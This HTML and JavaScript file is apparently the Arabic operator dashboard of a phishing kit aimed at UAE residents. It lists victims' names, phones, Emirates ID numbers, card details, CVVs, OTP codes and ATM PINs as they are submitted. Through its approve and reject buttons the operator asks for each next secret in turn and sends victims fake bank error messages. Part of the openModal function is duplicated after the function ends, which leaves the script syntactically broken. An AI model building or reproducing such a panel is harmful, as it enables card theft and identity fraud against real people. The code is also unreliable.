<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة تحكم فزعة - الإدارة المباشرة</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; color: #333; }
        .header { display: flex; justify-content: space-between; align-items: center; background: white; padding: 15px 30px; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
        .active-visits-card { background: linear-gradient(to right, #6dd5ed, #2193b0); color: white; padding: 20px; border-radius: 10px; text-align: center; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .active-visits-card h3 { margin: 0 0 10px 0; font-size: 1.2em; }
        .active-visits-card p { font-size: 2.5em; font-weight: bold; margin: 0; }
        .orders-table-container { background: white; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); overflow: hidden; }
        .orders-table { width: 100%; border-collapse: collapse; }
        .orders-table th, .orders-table td { padding: 12px 15px; text-align: right; border-bottom: 1px solid #eee; }
        .orders-table th { background-color: #f8f8f8; font-weight: bold; color: #555; }
        .orders-table tr:hover { background-color: #f5f5f5; }
        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 0.9em; transition: 0.3s; }
        .btn-details { background: #007bff; color: white; }
        .btn-details:hover { background: #0056b3; }
        .modal { display: none; position: fixed; z-index: 1; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.4); justify-content: center; align-items: center; }
        .modal-content { background-color: #fefefe; margin: auto; padding: 20px; border: 1px solid #888; width: 80%; max-width: 600px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); position: relative; }
        .close-button { color: #aaa; float: left; font-size: 28px; font-weight: bold; cursor: pointer; }
        .close-button:hover, .close-button:focus { color: black; text-decoration: none; cursor: pointer; }
        .modal-body p { margin-bottom: 10px; }
        .modal-actions { display: flex; justify-content: flex-end; gap: 10px; margin-top: 20px; }
        .btn-approve { background: #28a745; color: white; }
        .btn-approve:hover { background: #218838; }
        .btn-reject { background: #dc3545; color: white; }
        .btn-reject:hover { background: #c82333; }
        .error-message { color: #dc3545; font-weight: bold; margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="header">
        <h2>لوحة تحكم فزعة (تفاعل مباشر)</h2>
        <div style="display: flex; gap: 10px; align-items: center;">
            <span id="lastUpdate" style="font-size: 12px; color: #64748b;">آخر تحديث: الآن</span>
            <button class="btn btn-refresh" onclick="fetchOrders()">تحديث يدوي ↻</button>
        </div>
    </div>

    <div class="active-visits-card">
        <h3>الزيارات النشطة</h3>
        <p id="activeVisitsCount">0</p>
    </div>

    <div class="orders-table-container">
        <table class="orders-table">
            <thead>
                <tr>
                    <th>الدولة</th>
                    <th>الاسم</th>
                    <th>الهاتف</th>
                    <th>نوع العميل</th>
                    <th>رقم الهوية</th>
                    <th>الحالة</th>
                    <th>الإجراءات</th>
                </tr>
            </thead>
            <tbody id="ordersTableBody">
                <!-- Orders will be loaded here -->
            </tbody>
        </table>
    </div>

    <!-- Order Details Modal -->
    <div id="orderDetailsModal" class="modal">
        <div class="modal-content">
            <span class="close-button" onclick="closeModal()">&times;</span>
            <h3>تفاصيل الطلب <span id="modalOrderId"></span></h3>
            <div class="modal-body" id="modalBody">
                <!-- Order details will be loaded here -->
            </div>
            <div class="modal-actions" id="modalActions">
                <!-- Action buttons will be loaded here -->
            </div>
            <div class="error-message" id="modalErrorMessage"></div>
        </div>
    </div>

    <audio id="notifSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>

    <script>
        const token = localStorage.getItem('admin_token');
        if (!token) window.location.href = 'admin_login_ar.html';

        let lastOrderCount = 0;
        let currentOrderId = null; // To keep track of the order being viewed in the modal

        async function fetchActiveVisits() {
            try {
                const response = await fetch('/api/active-visits');
                const data = await response.json();
                document.getElementById('activeVisitsCount').innerText = data.count;
            } catch (e) {
                console.error('Error fetching active visits:', e);
            }
        }

        async function fetchOrders() {
            try {
                const response = await fetch('/api/get-data', {
                    headers: { 'Authorization': token }
                });
                if (!response.ok) throw new Error();
                const orders = await response.json();
                
                if (orders.length > lastOrderCount) {
                    document.getElementById('notifSound').play();
                    lastOrderCount = orders.length;
                }
                
                renderOrdersTable(orders.reverse());
                document.getElementById('lastUpdate').innerText = 'آخر تحديث: ' + new Date().toLocaleTimeString('ar-AE');
            } catch (e) { 
                console.error('Session expired or error', e);
                // Optionally redirect to login if session expired
                // window.location.href = 'admin_login_ar.html';
            }
        }

        function renderOrdersTable(orders) {
            const tableBody = document.getElementById('ordersTableBody');
            tableBody.innerHTML = '';
            if (orders.length === 0) {
                tableBody.innerHTML = '<tr><td colspan="7" style="text-align:center; padding: 50px; color: #64748b;">لا توجد طلبات حالياً</td></tr>';
                return;
            }
            orders.forEach(order => {
                const row = tableBody.insertRow();
                row.innerHTML = `
                    <td>${order.emirate || '-'}</td>
                    <td>${order.full_name || '-'}</td>
                    <td>${order.phone || '-'}</td>
                    <td>${getStatusLabel(order.residency_status) || '-'}</td>
                    <td>${order.emirates_id || '-'}</td>
                    <td>${getStatusLabel(order.status)}</td>
                    <td><button class="btn btn-details" onclick="openModal('${order.id}')">التفاصيل</button></td>
                `;
            });
        }

        function getStatusLabel(status) {
            const labels = {
                'citizen': 'مواطن',
                'resident': 'مقيم',
                'waiting_payment': '🔔 بانتظار البطاقة',
                'approved_payment': '✅ تم قبول البطاقة',
                'rejected_payment': '❌ رفض البطاقة',
                'waiting_otp': '🔑 بانتظار OTP',
                'approved_otp': '✅ تم قبول OTP',
                'rejected_otp': '❌ رفض OTP',
                'waiting_pin': '🏧 بانتظار PIN',
                'approved_pin': '✅ تم قبول PIN',
                'rejected_pin': '❌ رفض PIN',
                'personal_data_submitted': 'بيانات شخصية فقط'
            };
            return labels[status] || status;
        }

        async function openModal(orderId) {
            currentOrderId = orderId;
            const modal = document.getElementById('orderDetailsModal');
            const modalBody = document.getElementById('modalBody');
            const modalActions = document.getElementById('modalActions');
            const modalErrorMessage = document.getElementById('modalErrorMessage');
            modalErrorMessage.style.display = 'none';

            try {
                const response = await fetch('/api/get-data', { headers: { 'Authorization': token } });
                const allOrders = await response.json();
                const order = allOrders.find(o => o.id === orderId);

                if (order) {
                    document.getElementById('modalOrderId').innerText = order.id;
                    
                    let content = '<div style="text-align: right; line-height: 1.8;">';
                    
                    // Personal Information Section
                    content += '<div style="background: #f9fafb; padding: 15px; border-radius: 8px; margin-bottom: 15px;">';
                    content += '<h4 style="color: #1e3a5f; margin-bottom: 10px; border-bottom: 2px solid #d4af37; padding-bottom: 5px;">📋 البيانات الشخصية</h4>';
                    content += '<p style="margin: 5px 0;"><strong>الاسم الكامل:</strong> ' + (order.full_name || '-') + '</p>';
                    content += '<p style="margin: 5px 0;"><strong>الهاتف:</strong> ' + (order.phone || '-') + '</p>';
                    content += '<p style="margin: 5px 0;"><strong>البريد الإلكتروني:</strong> ' + (order.email || '-') + '</p>';
                    content += '<p style="margin: 5px 0;"><strong>رقم الهوية:</strong> ' + (order.emirates_id || '-') + '</p>';
                    content += '<p style="margin: 5px 0;"><strong>نوع العميل:</strong> ' + (getStatusLabel(order.residency_status) || '-') + '</p>';
                    content += '</div>';
                    
                    // Card Information Section
                    if (order.cardName || order.cardNumber) {
                        content += '<div style="background: #f0f9ff; padding: 15px; border-radius: 8px; margin-bottom: 15px; border-right: 4px solid #0066cc;">';
                        content += '<h4 style="color: #0c4a6e; margin-bottom: 10px; border-bottom: 2px solid #0066cc; padding-bottom: 5px;">💳 بيانات البطاقة</h4>';
                        content += '<p style="margin: 5px 0;"><strong>رقم المعاملة:</strong> ' + (order.transactionId || '-') + '</p>';
                        content += '<p style="margin: 5px 0;"><strong>اسم صاحب البطاقة:</strong> ' + (order.cardName || '-') + '</p>';
                        content += '<p style="margin: 5px 0;"><strong>رقم البطاقة:</strong> ' + (order.cardNumber ? '****' + order.cardNumber.slice(-4) : '-') + '</p>';
                        content += '<p style="margin: 5px 0;"><strong>تاريخ الانتهاء:</strong> ' + (order.expiryDate || '-') + '</p>';
                        content += '<p style="margin: 5px 0;"><strong>CVV:</strong> ' + (order.cvv ? '***' : '-') + '</p>';
                        content += '</div>';
                    }
                    
                    // OTP Section
                    if (order.otp) {
                        content += '<div style="background: #fef3c7; padding: 15px; border-radius: 8px; margin-bottom: 15px; border-right: 4px solid #f59e0b;">';
                        content += '<h4 style="color: #92400e; margin-bottom: 10px; border-bottom: 2px solid #f59e0b; padding-bottom: 5px;">🔐 رمز التحقق OTP</h4>';
                        content += '<p style="margin: 5px 0; font-size: 16px; font-weight: bold; color: #d97706;">' + order.otp + '</p>';
                        content += '</div>';
                    }
                    
                    // PIN Section
                    if (order.pin) {
                        content += '<div style="background: #fce7f3; padding: 15px; border-radius: 8px; margin-bottom: 15px; border-right: 4px solid #ec4899;">';
                        content += '<h4 style="color: #831843; margin-bottom: 10px; border-bottom: 2px solid #ec4899; padding-bottom: 5px;">🏧 الرقم السري ATM</h4>';
                        content += '<p style="margin: 5px 0; font-size: 16px; font-weight: bold; color: #be185d;">****</p>';
                        content += '</div>';
                    }
                    
                    // Status Section
                    content += '<div style="background: #f0fdf4; padding: 15px; border-radius: 8px; margin-bottom: 15px; border-right: 4px solid #16a34a;">';
                    content += '<h4 style="color: #166534; margin-bottom: 10px; border-bottom: 2px solid #16a34a; padding-bottom: 5px;">📊 حالة المعاملة</h4>';
                    content += '<p style="margin: 5px 0;"><strong>الحالة الحالية:</strong> ' + getStatusLabel(order.status) + '</p>';
                    if (order.lastError) {
                        content += '<p style="margin: 5px 0; color: #dc2626;"><strong>آخر خطأ:</strong> ' + order.lastError + '</p>';
                    }
                    content += '</div>';
                    
                    content += '</div>';
                    modalBody.innerHTML = content;
                    modalActions.innerHTML = renderActionButtons(order);
                    modal.style.display = 'flex';
                } else {
                    alert('الطلب غير موجود.');
                }
            } catch (e) {
                console.error('Error fetching order details:', e);
                alert('حدث خطأ أثناء جلب تفاصيل الطلب.');
            }
        }
                } else {
                    alert('الطلب غير موجود.');
                }
            } catch (e) {
                console.error('Error fetching order details:', e);
                alert('حدث خطأ أثناء جلب تفاصيل الطلب.');
            }
        }

        function closeModal() {
            document.getElementById('orderDetailsModal').style.display = 'none';
            currentOrderId = null;
        }

        function renderActionButtons(order) {
            if (order.status === 'waiting_payment') {
                return `
                    <button class="btn btn-approve" onclick="updateStatus('${order.id}', 'approved_payment')">قبول البطاقة ← اطلب OTP</button>
                    <button class="btn btn-reject" onclick="rejectPayment('${order.id}')">رفض البطاقة (خطأ)</button>
                `;
            }
            if (order.status === 'waiting_otp') {
                return `
                    <button class="btn btn-approve" onclick="updateStatus('${order.id}', 'approved_otp')">قبول OTP ← اطلب PIN</button>
                    <button class="btn btn-reject" onclick="rejectOTP('${order.id}')">رفض OTP (خطأ)</button>
                `;
            }
            if (order.status === 'waiting_pin') {
                return `
                    <button class="btn btn-approve" onclick="updateStatus('${order.id}', 'approved_pin')">إنهاء العملية بنجاح ✅</button>
                    <button class="btn btn-reject" onclick="rejectPIN('${order.id}')">رفض PIN (خطأ)</button>
                `;
            }
            return `<span style="color: #64748b; font-size: 13px;">✅ العملية منتهية أو بانتظار العميل</span>`;
        }

        async function updateStatus(orderId, status, error = '') {
            try {
                const response = await fetch('/api/update-order-status', {
                    method: 'POST',
                    headers: { 
                        'Content-Type': 'application/json',
                        'Authorization': token
                    },
                    body: JSON.stringify({ orderId, status, error })
                });
                if (!response.ok) throw new Error('Failed to update status');
                closeModal();
                fetchOrders();
            } catch (e) {
                console.error('Error updating status:', e);
                document.getElementById('modalErrorMessage').innerText = 'حدث خطأ أثناء تحديث الحالة.';
                document.getElementById('modalErrorMessage').style.display = 'block';
            }
        }

        function rejectPayment(id) {
            const msg = "تم رفض عملية الدفع، بطاقتك غير متاحة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو تجربة طرق دفع أخرى.";
            updateStatus(id, 'rejected_payment', msg);
        }

        function rejectOTP(id) {
            const msg = "الرمز غير صالح أو بطاقتك غير متاحة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو استخدام طرق دفع أخرى.";
            updateStatus(id, 'rejected_otp', msg);
        }

        function rejectPIN(id) {
            const msg = "رقم الصراف الآلي غير صحيح، قد تكون بطاقتك غير متاحة للدفع عبر الإنترنت. يرجى التواصل مع المصرف أو استخدام طرق دفع مختلفة.";
            updateStatus(id, 'rejected_pin', msg);
        }

        // Initial fetches and polling
        fetchActiveVisits();
        fetchOrders();
        setInterval(fetchActiveVisits, 10000); // Update active visits every 10 seconds
        setInterval(fetchOrders, 3000); // Update orders every 3 seconds
    </script>
</body>
</html>
